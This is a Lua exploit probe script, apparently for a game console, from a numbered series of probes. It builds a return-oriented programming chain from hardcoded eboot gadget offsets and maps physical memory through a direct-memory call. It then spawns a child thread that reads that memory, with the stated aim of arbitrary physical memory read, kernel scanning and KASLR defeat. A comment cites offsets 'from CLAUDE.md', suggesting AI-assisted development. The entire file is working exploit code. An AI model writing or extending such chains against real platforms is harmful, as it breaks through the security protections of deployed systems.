-- CRASH_CLASS: MODERATE
-- PROBE 562a: Child thread reads MapDM'd physical memory
--
-- 561b: MapDM accepts ALL physical addresses 0-16GB (rv=0).
-- 561c: ABORTED because syscall;ret NOT in eboot.
-- FIX: use syscall.syscall_address (the Lua loader's own syscall;ret gadget)
--      as discovered in probe 404a and used in all 404a-422b chains.
--
-- Chain: sysarch(129,&tcb) → read 4 qwords via mov rax,[rsi];ret →
--        write via mov [rdi],rax;ret → sentinel → thr_exit(431)
--
-- If this works: ARBITRARY PHYSICAL MEMORY READ → kernel scan → KASLR defeat

print("=== PROBE 562a: CHILD PHYS READ ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rb(a)
    local d = rd(a); if d == nil then return nil end
    if d < 0 then d = d + 0x100000000 end; return d
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function zero(buf, n)
    for off = 0, n-4, 4 do wd(buf + off, 0) end
end

local Z = uint64(0)
local sc6   = mk(6)
local sc20  = mk(20)
local sc73  = mk(73)
local sc477 = mk(477)
local sc455 = mk(455)
local sc593 = mk(593)

local pid = N(sc20())
print("pid=" .. pid)

-- Get eboot base
local info = memory.alloc(0x200)
zero(info, 0x200)
wd(info, 0x160)
pcall(function() sc593(Z, info) end)
local eb_lo = rd(info + 0x108) or 0
local eb_hi = rd(info + 0x10C) or 0
if eb_lo < 0 then eb_lo = eb_lo + 0x100000000 end
if eb_hi < 0 then eb_hi = eb_hi + 0x100000000 end
local eboot = uint64(string.format("0x%X%08X", eb_hi, eb_lo))
print(string.format("eboot=0x%X%08X", eb_hi, eb_lo))

-- Get libkernel base
zero(info, 0x200)
wd(info, 0x160)
pcall(function() sc593(uint64(0x2001), info) end)
local lk_lo = rd(info + 0x108) or 0
local lk_hi = rd(info + 0x10C) or 0
if lk_lo < 0 then lk_lo = lk_lo + 0x100000000 end
if lk_hi < 0 then lk_hi = lk_hi + 0x100000000 end
local lk = uint64(string.format("0x%X%08X", lk_hi, lk_lo))
print(string.format("lk=0x%X%08X", lk_hi, lk_lo))

local mapdm_fn = lk + uint64(0x15020)

-- Gadgets (eboot offsets from CLAUDE.md / verified probes)
local pop_rax_ret     = eboot + uint64(0x992)
local pop_rdi_ret     = eboot + uint64(0xC9DFE)
local pop_rsi_ret     = eboot + uint64(0xD77D)
local mov_mem_rdi_rax = eboot + uint64(0x92C67)  -- mov [rdi], rax; ret
local mov_rax_mem_rsi = eboot + uint64(0x1A5CC4) -- mov rax, [rsi]; ret

-- THE KEY FIX: syscall;ret from the Lua loader (probe 404a pattern)
local syscall_ret = nil
pcall(function() syscall_ret = N(syscall.syscall_address) end)
if not syscall_ret or syscall_ret == 0 then
    print("FATAL: syscall.syscall_address not available")
    print("=== 562a ABORT ===")
    return
end
-- Convert to uint64 for chain
local sc_ret_hi = math.floor(syscall_ret / 0x100000000)
local sc_ret_lo = syscall_ret % 0x100000000
local syscall_ret_u = uint64(string.format("0x%X%08X", sc_ret_hi, sc_ret_lo))
print(string.format("syscall_ret=0x%X", syscall_ret))
io.flush()

-- ============================================================
-- MapDM a physical page outside GPU pool
-- ============================================================
print("")
print("--- MapDM phys 0x200000000 ---")
io.flush()

local mapped_va = uint64("0x880000000")
local phys_addr = uint64("0x200000000")  -- 8GB, well outside GPU pool

-- Pre-map anonymous page
pcall(function()
    sc477(mapped_va, uint64(0x4000), uint64(3),
        uint64(0x1012), uint64(0xFFFFFFFF), Z)
end)

-- MapDM
local ok_md, rv_md = pcall(function()
    return native.fcall_with_rax(mapdm_fn, 0,
        mapped_va, uint64(0x4000), uint64(3), Z, phys_addr, uint64(0x4000))
end)
local md_rv = ok_md and N(rv_md) or -999
print(string.format("MapDM rv=%d", md_rv))
if md_rv ~= 0 then
    print("MapDM FAILED!")
    print("=== 562a ABORT ===")
    return
end

-- ============================================================
-- BUILD CHILD ROP CHAIN
-- ============================================================
print("")
print("--- Building child ROP chain ---")
io.flush()

local shared = memory.alloc(0x200)
zero(shared, 0x200)

-- Fake TCB
local fake_tcb = memory.alloc(0x1000)
zero(fake_tcb, 0x1000)
wq(fake_tcb, uint64(fake_tcb))

local tcb_ptr = memory.alloc(8)
wq(tcb_ptr, uint64(fake_tcb))

-- Child stack (2MB)
local stack_size = 0x200000
local ok_stk, child_stack = pcall(function()
    return sc477(Z, uint64(stack_size), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), Z)
end)
if not ok_stk then
    print("stack alloc FAIL")
    return
end

-- Build chain near top of stack
local chain_base = child_stack + uint64(stack_size - 0x1000)

local ci = 0
local function wc(val)
    wq(chain_base + uint64(ci * 8), val)
    ci = ci + 1
end

-- Layout: start_func = pop_rax_ret, so first [RSP] is popped into rax.
-- Pattern from CHAIN_14_10.md (407a): [num][gadget][pop_rax][num][gadget]...
-- But for multi-gadget sequences we interleave:
-- [num] ← popped by pop_rax (start_func or chained)
-- [return_addr] ← where ret goes
-- For sysarch(165, rdi=129, rsi=&tcb_ptr):
-- We need: rax=165, rdi=129, rsi=&tcb_ptr → syscall

-- sysarch(SET_FSBASE=129, &tcb_ptr)
wc(uint64(165))           -- [RSP+0] popped into rax by start_func (pop_rax_ret)
wc(pop_rdi_ret)           -- ret target
wc(uint64(129))           -- popped into rdi (SET_FSBASE)
wc(pop_rsi_ret)           -- ret target
wc(uint64(tcb_ptr))       -- popped into rsi (&tcb_ptr)
wc(syscall_ret_u)         -- syscall(165, 129, &tcb_ptr); ret

-- Read 4 qwords from mapped physical page
for qi = 0, 3 do
    wc(pop_rsi_ret)           -- ret from previous gadget lands here
    wc(mapped_va + uint64(qi * 8))  -- rsi = &mapped_va[qi]
    wc(mov_rax_mem_rsi)       -- rax = [rsi]; ret
    wc(pop_rdi_ret)           -- ret target
    wc(uint64(shared + 8 + qi * 8))  -- rdi = &shared[qi+1]
    wc(mov_mem_rdi_rax)       -- [rdi] = rax; ret
end

-- Write sentinel: [shared] = 0xDEADFACE
wc(pop_rdi_ret)
wc(uint64(shared))
wc(pop_rax_ret)
wc(uint64("0xDEADFACE"))
wc(mov_mem_rdi_rax)           -- [shared] = 0xDEADFACE; ret

-- thr_exit(431, status=0)
wc(pop_rax_ret)
wc(uint64(431))
wc(pop_rdi_ret)
wc(Z)
wc(syscall_ret_u)

print(string.format("chain: %d entries at chain_base", ci))
io.flush()

-- ============================================================
-- SPAWN CHILD via thr_new(455)
-- ============================================================
print("")
print("--- Spawning child ---")
io.flush()

-- RSP = ((stack_base + stack_size) & ~0xF) - 8
-- We want RSP = chain_base, so:
-- chain_base = ((stack_base + sz) & ~0xF) - 8
-- chain_base + 8 = (stack_base + sz) & ~0xF
-- If chain_base is 16-aligned: stack_base + sz = chain_base + 8

local thr_param = memory.alloc(0x40)
zero(thr_param, 0x40)

-- start_func = pop_rax_ret (first gadget — pops rax, then rets into chain)
wq(thr_param + 0x00, pop_rax_ret)
wq(thr_param + 0x08, Z)
wq(thr_param + 0x10, uint64(child_stack))
-- stack_size so that RSP lands on chain_base
-- RSP = ((child_stack + sz) & ~0xF) - 8 = chain_base
-- sz = chain_base + 8 - child_stack (assuming 16-aligned)
local sz_for_rsp = (chain_base + uint64(8)) - child_stack
wq(thr_param + 0x18, sz_for_rsp)
wq(thr_param + 0x20, Z)
wq(thr_param + 0x28, Z)

local child_tid = memory.alloc(8)
wq(child_tid, Z)
wq(thr_param + 0x30, uint64(child_tid))

local ok_thr, rv_thr = pcall(function()
    return sc455(uint64(thr_param), uint64(0x38))
end)
local thr_rv = ok_thr and N(rv_thr) or -999
local tid = rb(child_tid) or 0
print(string.format("thr_new rv=%d tid=%d", thr_rv, tid))
io.flush()

-- ============================================================
-- POLL FOR RESULTS
-- ============================================================
local sentinel = 0
for wait = 1, 200 do
    for j = 1, 5000 do local x = j * j end
    sentinel = rb(shared) or 0
    if sentinel == 0xDEADFACE then
        print(string.format("child done after %d polls", wait))
        break
    end
end

if sentinel ~= 0xDEADFACE then
    print(string.format("child NOT done (sentinel=0x%08X)", sentinel))
    local ok_k, rv_k = pcall(function()
        return mk(433)(uint64(tid), Z)
    end)
    print(string.format("thr_kill(tid,0)=%d", ok_k and N(rv_k) or -999))
else
    print("")
    print("=== PHYSICAL MEMORY READ RESULTS ===")
    print("phys=0x200000000 (8GB, outside GPU pool)")
    for qi = 0, 3 do
        local lo = rb(shared + 8 + qi * 8) or 0
        local hi = rb(shared + 8 + qi * 8 + 4) or 0
        print(string.format("  [+%02X] = 0x%08X%08X", qi * 8, hi, lo))
        if qi == 0 and lo == 0x464C457F then
            print("  *** ELF HEADER! ***")
        end
    end
end
io.flush()

-- Cleanup
pcall(function() sc73(mapped_va, uint64(0x4000)) end)
pcall(function() sc73(child_stack, uint64(stack_size)) end)

print("")
local pid2 = N(sc20())
print("pid=" .. pid2 .. (pid2 == pid and " OK" or " DEAD"))
print("=== 562a DONE ===")
